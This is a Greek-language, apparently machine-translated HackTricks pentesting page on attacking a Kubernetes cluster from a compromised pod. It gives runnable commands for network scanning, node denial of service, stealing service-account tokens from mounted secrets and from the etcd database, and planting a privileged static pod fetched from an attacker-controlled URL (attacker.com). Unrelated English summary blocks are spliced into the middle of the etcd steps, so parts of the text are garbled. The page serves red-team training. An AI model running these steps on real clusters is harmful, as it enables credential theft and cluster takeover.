# Επίθεση στο Kubernetes από μέσα σε ένα Pod

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ κάνοντας υποβολή PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## **Έξοδος από το Pod**

**Αν είστε αρκετά τυχεροί, μπορείτε να δραπετεύσετε από αυτό προς τον κόμβο:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Δραπέτευση από το pod

Για να προσπαθήσετε να δραπετεύσετε από τα pods, μπορεί να χρειαστεί να **εξελίξετε προνόμια** πρώτα, μερικές τεχνικές για να το κάνετε:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Μπορείτε να ελέγξετε αυτές τις **διαρρήξεις docker για να δοκιμάσετε να δραπετεύσετε** από ένα pod που έχετε διαρρεύσει:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Κατάχρηση Προνομίων Kubernetes

Όπως εξηγείται στην ενότητα για την **απαρίθμηση του kubernetes**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Συνήθως τα pods τρέχουν με ένα **token λογαριασμού υπηρεσίας** μέσα σε αυτά. Αυτός ο λογαριασμός υπηρεσίας μπορεί να έχει κάποια **προνόμια συνδεδεμένα με αυτόν** που θα μπορούσατε να **καταχραστείτε** για να **μετακινηθείτε** σε άλλα pods ή ακόμα και να **δραπετεύσετε** προς τους κόμβους που έχουν ρυθμιστεί μέσα στο cluster. Ελέγξτε πώς στο:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Κατάχρηση Προνομίων Στο Cloud

Αν το pod τρέχει μέσα σε ένα **περιβάλλον cloud**, ενδέχεται να μπορείτε να **διαρρεύσετε ένα token από το σημείο μεταδεδομένων** και να εξελίξετε προνόμια χρησιμοποιώντας το.

## Αναζήτηση ευάλωτων υπηρεσιών δικτύου

Καθώς βρίσκεστε μέσα στο περιβάλλον Kubernetes, αν δεν μπορείτε να εξελίξετε προνόμια καταχρηστικά τα τρέχοντα προνόμια των pods και δεν μπορείτε να δραπετεύσετε από το container, θα πρέπει να **αναζητήσετε πιθανά ευάλωτες υπηρεσίες.**

### Υπηρεσίες

**Για αυτόν τον σκοπό, μπορείτε να δοκιμάσετε να λάβετε όλες τις υπηρεσίες του περιβάλλοντος kubernetes:**
```
kubectl get svc --all-namespaces
```
Προεπιλεγμένα, το Kubernetes χρησιμοποιεί ένα επίπεδο δικτύωσης επίπεδο, το οποίο σημαίνει **ότι οποιοδήποτε pod/service εντός του cluster μπορεί να επικοινωνεί με άλλα**. Τα **namespaces** εντός του cluster **δεν έχουν καμία προεπιλεγμένη περιοριστική ασφάλεια δικτύου**. Οποιοσδήποτε στο namespace μπορεί να επικοινωνεί με άλλα namespaces.

### Σάρωση

Το παρακάτω σενάριο Bash (που προέρχεται από ένα [εργαστήριο Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) θα εγκαταστήσει και θα σαρώσει τις εύρεσης IP του cluster Kubernetes:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Ρίξτε μια ματιά στην ακόλουθη σελίδα για να μάθετε πώς μπορείτε **να επιτεθείτε σε συγκεκριμένες υπηρεσίες του Kubernetes** για **να διακινδυνεύσετε άλλα pods/ολόκληρο το περιβάλλον**:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### Sniffing

Στην περίπτωση που το **υποβαθμισμένο pod εκτελεί κάποια ευαίσθητη υπηρεσία** όπου άλλα pods χρειάζεται να πιστοποιηθούν, ενδέχεται να μπορείτε να αποκτήσετε τα διαπιστευτήρια που στέλνονται από τα άλλα pods **κατακορυφώνοντας τις τοπικές επικοινωνίες**.

## Διακίνδυνος Δικτύου

Από προεπιλογή, τεχνικές όπως το **ARP spoofing** (και χάρη σε αυτό το **DNS Spoofing**) λειτουργούν στο δίκτυο του Kubernetes. Στη συνέχεια, μέσα σε ένα pod, αν έχετε την **δυνατότητα NET\_RAW** (η οποία υπάρχει από προεπιλογή), θα μπορείτε να στείλετε προσαρμοσμένα διαμορφωμένα πακέτα δικτύου και να πραγματοποιήσετε **επιθέσεις MitM μέσω ARP Spoofing σε όλα τα pods που εκτελούνται στον ίδιο κόμβο.**\
Επιπλέον, αν το **κακόβουλο pod** εκτελείται στον **ίδιο κόμβο με τον DNS Server**, θα μπορείτε να πραγματοποιήσετε μια **επίθεση DNS Spoofing σε όλα τα pods στο cluster**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

Δεν υπάρχει καθορισμός πόρων στα αρχεία εκδόσεων του Kubernetes και **δεν εφαρμόζονται όρια** εύρους για τους containers. Ως επιτιθέμενοι, μπορούμε **να καταναλώσουμε όλους τους πόρους όπου εκτελείται το pod/deployment** και να αφαιρέσουμε πόρους από άλλα και να προκαλέσουμε ένα DoS στο περιβάλλον.

Αυτό μπορεί να γίνει με ένα εργαλείο όπως το [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Μπορείτε να δείτε τη διαφορά ενώ τρέχει το `stress-ng` και μετά
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Μετά-Εκμετάλλευση Κόμβου

Αν καταφέρετε να **δραπετεύσετε από το container** υπάρχουν μερικά ενδιαφέροντα πράγματα που θα βρείτε στον κόμβο:

* Η διεργασία **Container Runtime** (Docker)
* Περισσότερα **pods/containers** που τρέχουν στον κόμβο και μπορείτε να καταχραστείτε όπως αυτό (περισσότερα tokens)
* Ολόκληρο το **σύστημα αρχείων** και το **ΛΣ** γενικά
* Η υπηρεσία **Kube-Proxy** που ακούει
* Η υπηρεσία **Kubelet** που ακούει. Ελέγξτε τα αρχεία ρυθμίσεων:
* Κατάλογος: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* Άλλα **κοινά αρχεία Kubernetes**:
* `$HOME/.kube/config` - **Αρχείο Ρυθμίσεων Χρήστη**
* `/etc/kubernetes/kubelet.conf`- **Κανονικό Αρχείο Ρυθμίσεων**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **Αρχείο Ρυθμίσεων Bootstrap**
* `/etc/kubernetes/manifests/etcd.yaml` - **Διαμόρφωση etcd**
* `/etc/kubernetes/pki` - **Κλειδί Kubernetes**

### Εύρεση node kubeconfig

Αν δεν μπορείτε να βρείτε το αρχείο kubeconfig σε έναν από τους προηγούμενα σχολιασμένους διαδρόμους, **ελέγξτε το όρισμα `--kubeconfig` της διαδικασίας kubelet**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Κλοπή Μυστικών
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Το σενάριο [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) θα ανακτήσει αυτόματα **τα τοκεν των άλλων pods και θα ελέγξει αν έχουν την άδεια** που ψάχνετε (αντί να το ελέγχετε 1 προς 1):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Προνομιούχα DaemonSets

Ένα DaemonSet είναι ένα **pod** που θα **τρέχει** σε **όλους τους κόμβους του cluster**. Επομένως, αν ένα DaemonSet ρυθμιστεί με ένα **προνομιούχο λογαριασμό υπηρεσίας**, σε **ΟΛΟΥΣ τους κόμβους** θα μπορείτε να βρείτε το **διακριτικό** εκείνου του **προνομιούχου λογαριασμού** που θα μπορούσατε να καταχραστείτε.

Η εκμετάλλευση είναι η ίδια με αυτήν στην προηγούμενη ενότητα, αλλά τώρα δεν εξαρτάστε από την τύχη.

### Εναλλαγή στο Cloud

Αν το cluster διαχειρίζεται από ένα cloud service, συνήθως ο **Κόμβος θα έχει διαφορετική πρόσβαση στο τέλειο μεταδεδομένων** από το Pod. Επομένως, προσπαθήστε να **έχετε πρόσβαση στο τέλειο μεταδεδομένων από τον κόμβο** (ή από ένα pod με hostNetwork σε True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Κλοπή του etcd

Αν μπορείτε να καθορίσετε το [**όνομαΚόμβου**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) του Κόμβου που θα εκτελέσει το container, αποκτήστε ένα κέλυφος μέσα σε έναν κόμβο ελέγχου και αποκτήστε τη **βάση δεδομένων etcd**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane κόμβοι έχουν τον **ρόλο master** και σε **σύνολα διαχειριζόμενα στο cloud δεν θα μπορείτε να εκτελέσετε τίποτα σε αυτούς**.

#### Διαβάστε μυστικά από το etcd

Αν μπορείτε να εκτελέσετε το pod σας σε έναν κόμβο ελέγχου χρησιμοποιώντας τον επιλογέα `nodeName` στο αντικείμενο προδιαγραφής του pod, μπορείτε να έχετε εύκολη πρόσβαση στη βάση δεδομένων `etcd`, η οποία περιέχει όλη τη διαμόρφωση του σύνολου, συμπεριλαμβανομένων όλων των μυστικών.

Παρακάτω υπάρχει ένας γρήγορος και βρώμικος τρόπος να ανακτήσετε μυστικά από το `etcd` αν τρέχει στον κόμβο ελέγχου στον οποίο βρίσκεστε. Αν θέλετε μια πιο κομψή λύση που ξεκινά ένα pod με το εργαλείο πελάτη `etcd` `etcdctl` και χρησιμοποιεί τα διαπιστευτήρια του κόμβου ελέγχου για να συνδεθεί στο etcd οπουδήποτε τρέχει, ελέγξτε το [αυτό το παράδειγμα μεταφοράς](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) από τον @mauilion.

**Ελέγξτε αν το `etcd` τρέχει στον κόμβο ελέγχου και δείτε πού βρίσκεται η βάση δεδομένων (Αυτό είναι σε ένα σύνολο που δημιουργήθηκε με το `kubeadm`)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
## Attacking Kubernetes from Inside a Pod

When an attacker gains access to a Kubernetes pod, they are in a privileged position to perform further attacks within the cluster. Here are some techniques attackers can use from inside a pod:

1. **Pod Escape**: An attacker can try to break out of the pod to gain access to the host machine or other pods running on the same node.

2. **Pod to Node**: Attackers can attempt to pivot from the compromised pod to the underlying node to gain more control over the cluster.

3. **Service Account Compromise**: If the pod has access to sensitive service account tokens, attackers can abuse these tokens to escalate privileges.

4. **Network Sniffing**: Attackers can perform network sniffing within the cluster to intercept sensitive information being passed between pods.

5. **Pod Deletion**: An attacker with access to a pod can delete the pod, causing disruption to the application running in the cluster.

It is essential to secure pod configurations, limit pod privileges, and monitor pod activities to prevent and detect unauthorized actions within a Kubernetes cluster.
```
```bash
data-dir=/var/lib/etcd
```
**Προβολή των δεδομένων στη βάση δεδομένων etcd:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Εξαγάγετε τα τοκενς από τη βάση δεδομένων και εμφανίστε το όνομα του λογαριασμού υπηρεσίας**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**Ίδια εντολή, αλλά με μερικά greps για να επιστρέψει μόνο το προεπιλεγμένο τοκεν στο namespace kube-system**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, they are in a privileged position to perform further attacks within the cluster. This section covers various techniques that an attacker can use to escalate privileges and move laterally within the Kubernetes environment.

### Escalating Privileges

#### Accessing the Kubernetes API

One common technique is to access the Kubernetes API from within a compromised pod. This can be achieved by leveraging service account tokens or by mounting the host's `/var/run/secrets/kubernetes.io/serviceaccount` directory into the pod.

#### Exploiting Kubernetes RBAC

If the attacker can access the Kubernetes API, they may attempt to exploit Kubernetes Role-Based Access Control (RBAC) misconfigurations to gain additional privileges within the cluster.

### Moving Laterally

#### Pod Hopping

Once inside a pod, an attacker may attempt to move laterally by compromising other pods within the same node or different nodes in the cluster. This can be achieved by exploiting vulnerabilities in the Kubernetes network configuration or by abusing misconfigurations in pod security policies.

#### Accessing Secrets

Attackers may also target secrets stored within the cluster, such as API keys, passwords, or certificates. By accessing these secrets, an attacker can further escalate privileges and potentially exfiltrate sensitive data from the cluster.

### Conclusion

Securing Kubernetes clusters requires not only protecting the external attack surface but also considering the internal threats that can arise from compromised pods. By understanding common attack techniques, defenders can better secure their Kubernetes environments against malicious actors.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Μόνιμη Αντιγραφή/Αντικατοπτρισμένη Ανθρώπινη Ανθεκτικότητα

Τα _Στατικά Pods_ διαχειρίζονται απευθείας από τον δαίμονα kubelet σε ένα συγκεκριμένο κόμβο, χωρίς τον διακομιστή API να τα παρατηρεί. Αντίθετα από τα Pods που διαχειρίζονται από το επίπεδο ελέγχου (για παράδειγμα, ένα Deployment); αντ' αυτού, το **kubelet παρακολουθεί κάθε στατικό Pod** (και το επανεκκινεί αν αποτύχει).

Συνεπώς, τα στατικά Pods είναι πάντα **δεμένα με ένα Kubelet** σε ένα συγκεκριμένο κόμβο.

Το **kubelet προσπαθεί αυτόματα να δημιουργήσει ένα αντίγραφο Pod στον διακομιστή API του Kubernetes** για κάθε στατικό Pod. Αυτό σημαίνει ότι τα Pods που εκτελούνται σε έναν κόμβο είναι ορατά στον διακομιστή API, αλλά δεν μπορούν να ελεγχθούν από εκεί. Τα ονόματα των Pods θα προστίθενται με κατάληξη το όνομα του κόμβου με προηγούμενο παύλα.

{% hint style="danger" %}
Το **`spec` ενός στατικού Pod δεν μπορεί να αναφέρεται σε άλλα αντικείμενα API** (π.χ., ServiceAccount, ConfigMap, Secret, κλπ.). Έτσι **δεν μπορείτε να εκμεταλλευτείτε αυτήν τη συμπεριφορά για να ξεκινήσετε ένα pod με ένα αυθαίρετο serviceAccount** στον τρέχοντα κόμβο για να απειλήσετε το cluster. Ωστόσο, θα μπορούσατε να χρησιμοποιήσετε αυτό για να εκτελέσετε pods σε διαφορετικά namespaces (σε περίπτωση που αυτό είναι χρήσιμο για κάποιο λόγο).
{% endhint %}

Αν βρίσκεστε μέσα στον κόμβο φιλοξενίας μπορείτε να τον κάνετε να δημιουργήσει ένα **στατικό pod μέσα στον εαυτό του**. Αυτό είναι πολύ χρήσιμο επειδή μπορεί να σας επιτρέψει να **δημιουργήσετε ένα pod σε ένα διαφορετικό namespace** όπως το **kube-system**.

Για να δημιουργήσετε ένα στατικό pod, η [**τεκμηρίωση είναι μεγάλη βοήθεια**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Βασικά χρειάζεστε 2 πράγματα:

* Ρύθμιση της παραμέτρου **`--pod-manifest-path=/etc/kubernetes/manifests`** στην **υπηρεσία kubelet**, ή στην **διαμόρφωση kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) και επανεκκίνηση της υπηρεσίας
* Δημιουργία του ορισμού στην **ορισμό pod** στο **`/etc/kubernetes/manifests`**

**Μια άλλη πιο κρυφή μέθοδος θα ήταν:**

* Τροποποιήστε την παράμετρο **`staticPodURL`** από το αρχείο διαμόρφωσης του **kubelet** και ορίστε κάτι σαν `staticPodURL: http://attacker.com:8765/pod.yaml`. Αυτό θα κάνει τη διαδικασία kubelet να δημιουργήσει ένα **στατικό pod** παίρνοντας τη **διαμόρφωση από τον καθορισμένο URL**.

**Παράδειγμα** της **διαμόρφωσης pod** για τη δημιουργία ενός προνομιούχου pod στο **kube-system** που προέρχεται από [**εδώ**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Διαγραφή pods + μη προγραμματισμός κόμβων

Εάν ένας εισβολέας έχει **διαρρεύσει έναν κόμβο** και μπορεί **να διαγράψει pods** από άλλους κόμβους και **να κάνει άλλους κόμβους ανίκανους να εκτελέσουν pods**, τα pods θα επανεκκινηθούν στον εισβολέα κόμβο και θα μπορέσει **να κλέψει τα tokens** που εκτελούνται σε αυτά.\
Για [**περισσότερες πληροφορίες ακολουθήστε αυτούς τους συνδέσμους**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Αυτόματα Εργαλεία

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}
